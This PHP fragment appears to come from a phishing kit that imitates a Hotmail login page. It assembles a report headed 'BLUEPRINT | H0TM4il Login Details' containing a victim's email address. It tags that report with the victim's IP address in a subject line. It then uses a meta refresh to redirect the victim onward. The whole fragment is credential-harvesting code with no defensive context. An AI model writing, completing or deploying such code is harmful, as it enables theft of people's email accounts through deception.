...
$msg =  $_SESSION['msg'];
$msg .= "+ ------------------------------------------+\n";
$msg .= "| ヘ(◔_◔)ノ  💵BLUEPRINT | H0TM4il Login Details \n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "| 📧 EMAIL  :  ".$useremail."\n";
...
$subject = "Blue_prints v5 | H0TM4il"."IP: ".$_SERVER['REMOTE_ADDR'];
...
<meta http-equiv="refresh" content="5;URL='<?php echo $urlss; ?>ue<?php echo $hash; ?>'" />
